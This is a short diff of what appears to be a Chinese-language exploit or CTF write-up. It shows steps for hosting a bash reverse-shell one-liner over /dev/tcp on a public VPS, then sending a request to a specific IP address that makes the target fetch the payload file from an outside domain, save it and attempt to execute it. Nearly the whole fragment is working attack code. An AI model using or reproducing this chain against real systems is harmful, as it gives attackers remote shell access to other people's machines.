@@ -32,7 +32,9 @@
 ```
 先在公网vps web目录下写入反弹shell一句话
 bash -i >& /dev/tcp/公网IP/公网端口 0>&1
-然后写入一个结尾带|的文件
+然后写入一个的文件
+http://117.50.3.97:8004/?url=http://ipv4.ssssdl.xyz/aa.txt&filename=a
+尝试执行
 ```
 
 
